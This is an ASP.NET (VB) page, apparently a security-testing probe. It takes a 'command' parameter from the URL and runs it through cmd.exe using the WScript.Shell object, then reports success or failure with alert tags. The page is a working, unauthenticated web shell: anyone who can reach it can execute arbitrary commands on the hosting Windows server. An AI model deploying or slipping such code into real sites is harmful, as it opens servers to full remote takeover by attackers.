<%@ Page Language="VB" %>

<script runat="server">
    Public Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs)
        
        'Response.ContentType = "text/xml"
        Response.ContentType = "text/plain"
        Response.ContentEncoding = System.Text.Encoding.UTF8

        Dim wshObject As Object = Nothing
        Dim commandToExecute As String = ""
        
        Try
            commandToExecute = Request.QueryString("command")
        Catch ex As Exception
        End Try
        
        Try
            wshObject = CreateObject("WSCRIPT.SHELL")
            
            Try
                Dim retCode As Integer = wshObject.Run("cmd.exe /c " + commandToExecute, 0, True)
                Response.Write("<Alert:Red>" & vbCrLf)
                Response.Write("Successfully executed the '" & commandToExecute & "' command using cmd.exe. Return code was '" & retCode.ToString() & "'.")
            Catch ex As Exception
                Response.Write("<Alert:Yellow>" & vbCrLf)
                Response.Write("Succcessfully created the WSH (SWSCRIPT.SHELL) object, but failed to execute the '" + commandToExecute + "' command using cmd.exe.")
            End Try
        Catch ex As Exception
            Response.Write("The WSH (SWSCRIPT.SHELL) object could not be created.")
        End Try
            
    End Sub
</script>
